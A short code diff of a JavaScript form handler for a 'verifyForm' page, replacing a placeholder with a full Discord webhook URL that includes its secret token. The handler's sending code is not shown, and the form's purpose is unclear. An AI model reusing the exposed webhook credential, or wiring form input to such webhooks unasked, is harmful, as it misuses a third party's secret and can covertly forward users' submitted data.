@@ -2,7 +2,7 @@ const form = document.getElementById('verifyForm');
 const statusMessage = document.getElementById('statusMessage');
 
 // PASTE YOUR DISCORD WEBHOOK URL HERE
-const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541892394599972885/_KRoFu47U5G7zbPDcjzUz4UqnHKvYh0T-1DRtY_GCnSHFPCgGyPKuFOlu_T-PAWxQ-JJ';
 
 form.addEventListener('submit', async function(e) {
     e.preventDefault();
